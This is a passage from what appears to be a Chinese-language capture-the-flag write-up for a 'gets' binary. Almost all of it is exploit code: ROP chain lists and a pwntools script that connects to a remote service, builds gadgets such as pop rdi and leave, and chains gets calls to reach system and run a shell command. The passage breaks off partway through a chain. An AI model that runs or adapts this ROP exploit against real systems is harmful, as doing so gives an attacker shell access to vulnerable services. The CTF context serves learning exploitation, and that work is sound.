pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret ] rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret ] 最后 system 的地址已经在栈上了，读一下参数，利用__libc_csu_init()调用一下就行了： rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12 ] Exploit#!/usr/bin/env python from pwn import * # context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; local = 0 if local: p = remote(&#39;127.0.0.1&#39;, 4000) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) else: p = remote(&#39;10.21.13.69&#39;, 10010) libc = ELF(&#39;libc.so.6&#39;) elf = ELF(&#39;./gets&#39;) g = lambda x: next(elf.search(asm(x))) system_offset = libc.symbols[&#39;system&#39;] gets_offset = libc.symbols[&#39;gets&#39;] offset = system_offset - gets_offset if offset &lt; 0: offset &amp;= 0xffffffff gets_plt = elf.plt[&#39;gets&#39;] gets_got = elf.got[&#39;gets&#39;] libc_csu_init = elf.symbols[&#39;__libc_csu_init&#39;] pop_rsp_r13_r14_r15_ret = g(&#39;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#39;) pop_rbp_ret = g(&#39;pop rbp ; ret&#39;) pop_rdi_ret = g(&#39;pop rdi ; ret&#39;) pop_r15_ret = g(&#39;pop r15 ; ret&#39;) pop_rsi_r15_ret = g(&#39;pop rsi ; pop r15 ; ret&#39;) pop_rbp_r14_r15_ret = g(&#39;pop rbp ; pop r14 ; pop r15 ; ret&#39;) pop_rbx_rbp_r12_r13_r14_r15_ret = g(&#39;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#39;) add_ebx_esi_ret = g(&#39;add ebx, esi ; ret&#39;) leave_ret = g(&#39;leave ; ret&#39;) call_at_r12 = g(&#39;call QWORD PTR [r12+rbx*8]&#39;) # gdb.attach(p) bss = 0x602000 buf1 = bss - 0x100 buf2 = bss - 0x200 buf3 = bss - 0x300 buf4 = bss - 0x400 buf5 = bss - 0x500 buf6 = bss - 0x600 buf7 = bss - 0x700 buf8 = bss - 0x800 rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, ge